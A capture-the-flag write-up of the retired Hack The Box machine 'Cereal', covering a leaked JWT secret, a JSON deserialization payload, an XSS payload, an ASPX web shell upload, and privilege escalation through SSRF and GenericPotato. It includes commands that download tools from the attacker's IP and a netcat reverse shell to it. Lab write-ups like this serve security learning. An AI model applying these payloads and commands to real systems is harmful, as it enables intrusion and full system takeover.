# Cereal

This is the write-up for the box Cereal that got retired at the 29th May 2021.
My IP address was 10.10.14.11 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.217    cereal.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/cereal.nmap 10.10.10.217
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac (RSA)
|   256 fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac (ECDSA)
|_  256 cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e (ED25519)
80/tcp  open  http     Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to https://10.10.10.217/
|_http-server-header: Microsoft-IIS/10.0
443/tcp open  ssl/http Microsoft IIS httpd 10.0
|_http-title: Cereal
| ssl-cert: Subject: commonName=cereal.htb
| Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb
| Not valid before: 2020-11-11T19:57:18
|_Not valid after:  2040-11-11T20:07:19
| tls-alpn:
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: 2022-05-14T14:30:00+00:00; +1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The web service on port 80 automatically forwards to the webpage on port 443.

## Checking HTTPS (Port 443)

The certificate contains another hostname _source.cereal.htb_ that has to be added to the _/etc/hosts_ file to access it.

The webpage on the IP and the hostname _cereal.htb_ is a custom-developed login form.
The hostname _source.cereal.htb_ forwards to a _Compilation Error_ from the **ISS Web Server** and discloses the versions of the **.NET Framework** and **ASP.NET**:

![ISS compilation error](cereal_web-1.png)

Lets search for hidden directories and _aspx_ files with **Gobuster** on _source.cereal.htb_:
```
gobuster -u https://source.cereal.htb/ dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -x asp,aspx -k
```

It finds the following directories, but all of them resolve in the HTTP status code _403 Forbidden_:
- _/.git_
- _/uploads_
- _/aspnet_client_

Searching for hidden directories and _aspx_ files in these directories:
```
gobuster -u https://source.cereal.htb/.git/ dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -x asp,aspx -k

gobuster -u https://source.cereal.htb/uploads/ dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -x asp,aspx -k
```

In the directory _/.git_ is a whole repository file tree, so lets download everything with [git-dumper](https://github.com/arthaud/git-dumper):
```
git_dumper.py https://source.cereal.htb/.git/ source.cereal.htb/
```

It contains source code for a **.NET application**.

Checking the logs of the repository:
```
git log
```
```
(...)
commit 7bd9533a2e01ec11dfa928bd491fe516477ed291
Author: Sonny <sonny@cere.al>
Date:   Thu Nov 14 21:40:06 2019 -0600

    Security fixes
```

There are two potential usernames that work on this application:
- sonny
- chocula

One of the commits has the comment _"Security fixes"_ so that may disclose a vulnerability:
```
git show 7bd9533a2e01ec11dfa928bd491fe516477ed291
```

This commit added a filter to prevent **deserialization attacks** and removed a **JWT Token**:
```cs
// (...)
string json = db.Requests.Where(x => x.RequestId == id).SingleOrDefault().JSON;
// Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial
if (json.ToLower().Contains("objectdataprovider") || json.ToLower().Contains("windowsidentity") || json.ToLower().Contains("system"))
{
    return BadRequest(new { message = "The cereal police have been dispatched." });
}
var cereal = JsonConvert.DeserializeObject(json, new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.Auto
});
// (...)
var key = Encoding.ASCII.GetBytes("secretlhfIH&FY*#oysuflkhskjfhefesf");
// (...)
```

This token is used in the file _Services/UserService.cs_ which uses **Claims** to generate it:
```cs
// (...)
// authentication successful so generate jwt token
var tokenHandler = new JwtSecurityTokenHandler();
var key = Encoding.ASCII.GetBytes("****");
var tokenDescriptor = new SecurityTokenDescriptor
{
    Subject = new ClaimsIdentity(new Claim[]
    {
        new Claim(ClaimTypes.Name, user.UserId.ToString())
    }),
    Expires = DateTime.UtcNow.AddDays(7),
    SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
};
var token = tokenHandler.CreateToken(tokenDescriptor);
user.Token = tokenHandler.WriteToken(token);
// (...)
```

A new .NET project on Visual Studio with this code can be created and compiled.
There are some modifications to make and the code can be found in this repository called _cereal_jwt-generate.cs_.

Executing the binary to generate a JWT token:
```
cereal_jwt-generate.exe

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjEiLCJuYmYiOjE2NTI1NDg2MTUsImV4cCI6MTY1MzE1MzQxNSwiaWF0IjoxNjUyNTQ4NjE1fQ.RJSP7T11NA9rUK8d2G6QrYiqXfOahE5Hn9pKzvnQdUo
```

In the login form on _cereal.htb_ in the file _auth-header.js_ it shows which headers it needs:
```js
// (...)
if (currentUser && currentUser.token) {
        return { Authorization: `Bearer ${currentUser.token}`, 'Content-Type': 'application/json'
        }
    }
// (...)
```

The file _authentication.service.js_ shows that the token has to be stored in our browsers local storage:
```js
const currentUserSubject = new BehaviorSubject(JSON.parse(localStorage.getItem('currentUser')));
// (...)
```

Adding token to the local storage with the browsers **Developer Tools**:

![Adding token with developer tools](cereal_web-2.png)

After refreshing the page, it logs us in and shows another tool:

![Cereal request](cereal_web-3.png)

### Analyzing Web Application

After requesting a cereal, it logs us out because it does not send the authorization header with the request.
By intercepting the request with **Burpsuite** and adding the _Authorization_ header and changing the _Content-Type_ header, it sends a valid response back:
```
POST /requests HTTP/2
Host: 10.10.10.217
(...)
Content-Type: application/json
(...)
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjEiLCJuYmYiOjE2NTI1NDg2MTUsImV4cCI6MTY1MzE1MzQxNSwiaWF0IjoxNjUyNTQ4NjE1fQ.RJSP7T11NA9rUK8d2G6QrYiqXfOahE5Hn9pKzvnQdUo

{"json":"{\"title\":\"test1\",\"flavor\":\"pizza\",\"color\":\"#FFF\",\"description\":\"test1\"}"}
```
```json
{"message":"Great cereal request!","id":9}
```

As seen before in the source code in _Controllers/RequestsControllers.cs_ there is a filter against **deserialization attacks**.
If this filter can be bypassed, then it should be possible to exploit this vulnerability.
The code also shows that it uses the library [Newtonsoft.Json](https://www.newtonsoft.com/json).

This [research paper on Blackhat.com](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf) has some examples for this library to use for the payload.

The source code of the file _DownloadHelper.cs_ has code to download files from a web server, but the function is not called anywhere, so we will use it in our payload.

Deserialization payload:
```json
{
  "$type": "Cereal.DownloadHelper, Cereal",
  "URL": "http://10.10.14.11/cmd.aspx",
  "FilePath": "C:/inetpub/source/uploads/cmd.aspx"
}
```

In _Controllers/RequestsControllers.cs_ is another policy called _RestrictIP_.
This is used in _Startup.cs_ and refers to _appsettings.json_:
```
"ApplicationOptions": {
    "Whitelist": [ "127.0.0.1", "::1" ]
```

So the deserialization can only be accessed from localhost, which means that a **Server-Side Request Forgery (SSRF)** or **Cross-Site Scripting (XSS)** vulnerability has to be found to bypass that restriction.

In the file _App/App.jsx_ it discloses that there is an _/admin_ path:
```html
<PrivateRoute exact path="/" component={HomePage} />
<PrivateRoute path="/admin" component={AdminPage} />
<Route path="/login" component={LoginPage} />
```

The file _AdminPage/AdminPage.jsx_ uses the module _react-marked-markdown_ which is not maintained anymore and has a [XSS vulnerability](https://github.com/advisories/GHSA-m7qm-r2r5-f77q).

Cross-Site Scripting payload:
```
[XSS](javascript: document.write`<img src=http://10.10.14.11/test />`)
```

Sending the request with the XSS payload:
```
POST /requests HTTP/2
Host: 10.10.10.217
(...)
Content-Type: application/json
(...)
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjEiLCJuYmYiOjE2NTI1NDg2MTUsImV4cCI6MTY1MzE1MzQxNSwiaWF0IjoxNjUyNTQ4NjE1fQ.RJSP7T11NA9rUK8d2G6QrYiqXfOahE5Hn9pKzvnQdUo

{"json":"{\"title\":\"[XSS](javascript: document.write`<img src=http://10.10.14.11/test />`)\",\"flavor\":\"pizza\",\"color\":\"#FFF\",\"description\":\"test1\"}"}
```

After a while, the listener on my IP and port 80 gets a response back and proofs that this XSS payload works.

We now have all information to create a script that will exploit this vulnerability chain.
1. Creating a **JWT token** with the secret gained from the git commit
2. Storing the deserialization payload on the box by posting to _/requests_
3. Sending the XSS payload to hit the deserialized object from localhost to bypass the _RestrictIP_ function
4. Waiting for admin to hit the XSS payload and upload our webshell onto the box

The script can be found in this repository called _cereal_exploit.py_.
Executing our Python script that exploits all these vulnerabilities and uploads an **ASPX Web Shell**:
```
python3 cereal_exploit.py
```

It will upload the web shell _cmd.aspx_ into the _/uploads_ directory of _source.cereal.htb_.

![ASPX web shell](cereal_web-4.png)

### Enumerating the File System

In the directory _C:\inetpub\cereal\db_ is a **SQLite database** that contains the password of the user _sonny_:
```
type C:\inetpub\cereal\db\cereal.db
```
```
sonny:mutual.madden.manner38974
```

These credentials work on SSH:
```
ssh sonny@10.10.10.217
```

## Privilege Escalation

The user _sonny_ has the _SeImpersonatePrivilege_ permission enabled:
```
whoami /all
```
```
Privilege Name                Description                               State
============================= ========================================= =======
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

Unfortunately there is a firewall that denies connections to outbound port 135 and a **RoguePotato** attack is not possible.
When checking the listening ports with `netstat -an` there is port 8080 running.

Forwarding port 8080 to our local client:
```
ssh -L 8080:127.0.0.1:8080 sonny@10.10.10.217
```

When browsing to _127.0.0.1:8080_ it is possible to access this web service with the title _"Cereal System Manager"_.
By inspecting the network connections with the browsers **Developer Tools**, it shows that it makes a connection to _/api/graphql_.

**GraphQL** is a query language for APIs and I will use [GraphQL Playground](https://github.com/graphql/graphql-playground) to interact with it.
```
URL Endpoint: http://localhost:8080/api/graphql
```

This IDE shows the _schema_ and _docs_ on the right side and we can request the data and enumerate API for useful information.
The query _updatePlant_ has an argument _sourceURL_ that allows us to run HTTP requests:
```
mutation {
  updatePlant(plantId:1, version:1.1, sourceURL:"http://10.10.14.11/")
}
```

This feature can be used to abuse a **Server-Side Request Forgery** attack and escalate privileges of the current user.
For this exploit I will use [GenericPotato](https://github.com/micahvandeusen/GenericPotato).

Downloading _GenericPotato.exe_ and _nc.exe_ onto the box:
```
powershell wget 10.10.14.11/GenericPotato.exe -o GenericPotato.exe

powershell wget 10.10.14.11/nc.exe -o nc.exe
```

Executing _GenericPotato.exe_ and starting the listener on port 8888:
```
GenericPotato.exe -e HTTP -p nc.exe -a "10.10.14.11 80 -e powershell"

[+] Starting HTTP listener on port http://127.0.0.1:8888
[+] Listener ready
```

Sending a request to the listener from the **GraphQL** service:
```
mutation {
  updatePlant(plantId:1, version:1.1, sourceURL:"http://127.0.0.1:8888/")
}
```

After sending the request, the listener on my IP and port 80 starts a reverse shell as System!
